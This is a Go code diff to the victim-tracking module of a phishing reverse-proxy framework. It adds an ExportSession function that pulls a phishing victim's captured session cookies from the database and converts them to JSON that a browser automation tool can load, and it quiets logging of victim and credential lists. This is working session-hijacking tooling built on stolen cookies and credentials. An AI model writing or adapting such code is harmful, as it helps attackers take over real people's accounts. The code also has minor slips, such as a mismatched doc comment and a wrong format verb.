@@ -1,8 +1,12 @@
 package tracking
 
 import (
+	"encoding/json"
 	"fmt"
 	"os"
+	"time"
+
+	"github.com/muraenateam/muraena/module/necrobrowser"
 
 	"github.com/evilsocket/islazy/tui"
 
@@ -36,7 +40,7 @@ func (module *Tracker) ShowCredentials() {
 	var rows [][]string
 
 	victims, err := db.GetAllVictims()
-	log.Info("All Victims: %v", victims)
+	module.Debug("All Victims: %v", victims)
 
 	if err != nil {
 		module.Debug("error fetching all victims: %s", err)
@@ -48,7 +52,7 @@ func (module *Tracker) ShowCredentials() {
 			module.Debug("error fetching victim %s: %s", vID, err)
 		}
 
-		log.Info("Creds for victim %s: %d", vID, victim.CredsCount)
+		module.Debug("Creds for victim %s: %d", vID, victim.CredsCount)
 
 		for i := 0; i < victim.CredsCount; i++ {
 			t := tui.Green(victim.ID)
@@ -65,6 +69,50 @@ func (module *Tracker) ShowCredentials() {
 
 	tui.Table(os.Stdout, columns, rows)
 
+}
+
+// ShowVictims prints the list of victims
+func (module *Tracker) ExportSession(id string) {
+
+	const timeLayout = "2006-01-02 15:04:05 -0700 MST"
+
+	rawCookies, err := db.GetVictimCookiejar(id)
+	if err != nil {
+		module.Debug("error fetching victim %d cookie jar: %s", id, err)
+	}
+
+	// this extra loop and struct is needed since browsers expect the expiration time in unix time, so also different type
+	var cookieJar []necrobrowser.SessionCookie
+
+	for _, c := range rawCookies {
+		log.Debug("trying to parse  %s  with layout  %s", c.Expires, timeLayout)
+		t, err := time.Parse(timeLayout, c.Expires)
+		if err != nil {
+			log.Warning("warning: cant's parse Expires field (%s) of cookie %s. skipping cookie", c.Expires, c.Name)
+			continue
+		}
+
+		nc := necrobrowser.SessionCookie{
+			Name:     c.Name,
+			Value:    c.Value,
+			Domain:   c.Domain,
+			Expires:  t.Unix(),
+			Path:     c.Path,
+			HTTPOnly: c.HTTPOnly,
+			Secure:   c.Secure,
+			Session:  t.Unix() < 1,
+		}
+
+		cookieJar = append(cookieJar, nc)
+	}
+
+	cookieJarJson, err := json.Marshal(cookieJar)
+	if err != nil {
+		module.Warning("Error marshalling the cookieJar: %s", err)
+		return
+	}
+
+	log.Info("Victim %s CookieJar:\n\n%s", id, cookieJarJson)
 }
 
 // ShowVictims prints the list of victims
@@ -86,10 +134,9 @@ func (module *Tracker) ShowVictims() {
 		module.Debug("error fetching all victims: %s", err)
 	}
 
-	log.Info("All Victims: %v", victims)
+	module.Debug("All Victims: %v", victims)
 
 	for _, vId := range victims {
-		log.Info("victim id: %v", vId)
 
 		v, err := db.GetVictim(vId)
 		if err != nil {
